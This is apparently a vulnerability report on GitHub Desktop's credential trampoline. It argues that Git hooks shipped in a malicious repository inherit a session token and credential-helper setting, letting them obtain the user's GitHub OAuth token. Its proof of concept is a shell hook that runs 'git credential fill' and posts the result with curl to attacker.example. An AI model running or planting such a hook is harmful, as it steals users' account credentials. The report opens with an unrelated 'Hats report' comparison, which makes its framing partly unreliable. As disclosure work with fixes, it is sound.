## Title
Malicious repository Git hooks inherit the Desktop credential trampoline and can exfiltrate signed-in GitHub/GHES tokens - (File: `app/src/lib/git/core.ts`)

### Summary
The Hats report describes a shared, reentrant guard state (`_existingModulesHash` / `_guardEntries`) that a nested transaction can silently overwrite so the top-level invariant check passes even though the invariant was violated. GitHub Desktop has an analogous "shared session state that spans an outer git operation and any nested/child process it spawns" pattern in the credential trampoline: the `DESKTOP_TRAMPOLINE_TOKEN` and `credential.helper=desktop` config live for the *entire* duration of a single `git()` invocation, including any repository-defined hook that Git executes as a child of that process. A hook belonging to an attacker-controlled repository can reenter the trampoline's credential helper using that still-valid session and pull the user's real GitHub/GHES credentials, even though the hook has nothing to do with the endpoint whose credentials it requests.

### Finding Description
`git()` in [1](#0-0)  merges the hooks-proxy environment and the trampoline environment into the single environment used for the spawned Git process:

```
return withHooksEnv(
  hooksEnv =>
    withTrampolineEnv(
      async env => {
        ...
        exec(args, path, { ...opts, env: { TERM:'dumb', ...opts.env, ...hooksEnv, ...env } })
```

`withTrampolineEnv` injects `DESKTOP_PORT`, `DESKTOP_TRAMPOLINE_TOKEN`, and a `GIT_CONFIG_PARAMETERS` that globally sets `credential.helper=desktop` for the process [2](#0-1) . The token itself is a single random UUID that stays valid (`isValidTrampolineToken`) for the whole lifetime of that outer call — it is only revoked in the `finally` block after `fn` (the entire git invocation) resolves [3](#0-2) .

Crucially, `withHooksEnv` only intercepts/sandboxes hooks when the caller explicitly opts in via `opts.interceptHooks` **and** the hooks-environment feature is enabled; otherwise it short-circuits and returns the untouched environment, i.e. Git executes the repository's hook scripts natively with whatever environment the spawned Git process has: `if (!opts?.interceptHooks || !getHooksEnvEnabled()) { return fn(opts?.env) }` [4](#0-3) . Because the token/credential-helper config was merged into the outer process's environment *before* this check even matters, any hook Git spawns as a child of that process (`post-checkout`, `post-merge`, `pre-push`, `post-commit`, etc. — all standard, attacker-authorable hooks shipped inside the repository, enumerated in `knownHooks` [5](#0-4) ) inherits `DESKTOP_TRAMPOLINE_TOKEN` and `credential.helper=desktop` from its parent process by normal OS environment inheritance.

A hook can therefore run its own `git credential fill` (or any authenticated `git` subcommand such as `git ls-remote https://github.com/...`) using the inherited env. This reaches the Desktop trampoline server, which validates only the token — not which repository/remote originated the request — via `isValidTrampolineToken` [6](#0-5) , and then resolves credentials purely by matching the requested endpoint's origin to a signed-in account, with no binding to the repository or remote that started the git operation: [7](#0-6) [8](#0-7) 

If the hook requests credentials for `https://github.com` (or any GHES host the victim is signed into), `getGitHubCredential`/`credWithAccount` returns the real account login and OAuth token, exactly as if Git itself had asked for it during a legitimate HTTPS operation.

### Impact Explanation
Any repository the user clones, fetches, pulls, or checks out — none of which requires the user to run untrusted code deliberately — can carry a hook script that silently exfiltrates the victim's real GitHub.com/GHES OAuth token to an attacker-controlled process/network destination. This is a full account-credential exfiltration triggered purely by interacting with an attacker-supplied remote, matching the "credential/token exfiltration" impact class, and it doesn't require local access, admin rights, or any unnatural extra step: normal Git hook execution during ordinary Desktop operations is enough.

### Likelihood Explanation
Git hooks are executed automatically by Git as a side effect of common commands (checkout, merge, commit, push) whenever they exist in `.git/hooks` (including hooks materialized from a repo's tracked `core.hooksPath` or from LFS/submodule setup scripts) and the trampoline env (`DESKTOP_TRAMPOLINE_TOKEN` + `credential.helper=desktop`) is present on essentially every `git()` invocation, not just the specific commands that call `withHooksEnv` with `interceptHooks` set. This makes the attack surface broad and the trigger low-effort: an attacker only needs the victim to add/clone/pull their repository once.

### Recommendation
- Never let `DESKTOP_TRAMPOLINE_TOKEN`/`GIT_CONFIG_PARAMETERS` (credential.helper=desktop) leak into the environment of hook subprocesses that aren't explicitly proxied/sanitized, regardless of whether `interceptHooks`/hooks-env feature is enabled for that command.
- Scope trampoline credential lookups to the specific remote/repository context of the outer git invocation instead of a bare token-validity check, so a hook cannot request credentials for an unrelated host.
- Apply the same env allow-listing used in `hooks-proxy.ts` (`safePrefixes`/`excludedEnvVars`) unconditionally at the point Git is spawned, not only when the optional hooks-interception mechanism is engaged.

### Proof of Concept
1. Attacker publishes a repository containing `.git/hooks/post-checkout` (or ships it via a tracked `core.hooksPath` directory) with:
   ```sh
   #!/bin/sh
   git credential fill <<EOF > /tmp/leak
   protocol=https
   host=github.com
   EOF
   curl -s -X POST https://attacker.example/leak --data-binary @/tmp/leak
   ```
2. Victim clones or pulls the repository in GitHub Desktop.
3. Desktop's `git()` spawns the clone/checkout process with `DESKTOP_TRAMPOLINE_TOKEN` and `GIT_CONFIG_PARAMETERS='credential.helper=desktop'` set in its environment (`core.ts` lines 276-294; `trampoline-environment.ts` lines 122-147).
4. Because this particular operation does not pass `interceptHooks` for `post-checkout` (or the hooks-env feature is disabled, its default state for many operations), `withHooksEnv` short-circuits and Git executes `post-checkout` natively, inheriting the parent's environment (`with-hooks-env.ts` lines 34-36).
5. The hook's `git credential fill` call reaches the trampoline server with the still-valid token, and `getGitHubCredential`/`findGitHubTrampolineAccount` return the victim's real GitHub OAuth token, which the hook exfiltrates to the attacker's server.

export async function withTrampolineToken<T>(
  fn: (token: string) => Promise<T>
): Promise<T> {
  const token = requestTrampolineToken()
  let result

  try {
    result = await fn(token)
  } finally {
    revokeTrampolineToken(token)
  }

  return result
}
